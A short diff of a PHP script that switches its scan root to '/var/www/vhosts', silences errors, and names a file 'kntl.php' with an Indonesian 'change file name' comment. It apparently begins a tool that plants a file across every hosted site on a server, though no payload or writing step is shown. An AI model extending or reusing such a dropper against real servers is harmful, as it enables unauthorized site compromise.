@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
 
-$root = '/var/www';
+$root = '/var/www/vhosts';
 $scan = scandir($root);
 
 $nama = 'kntl.php'; // ganti nama file
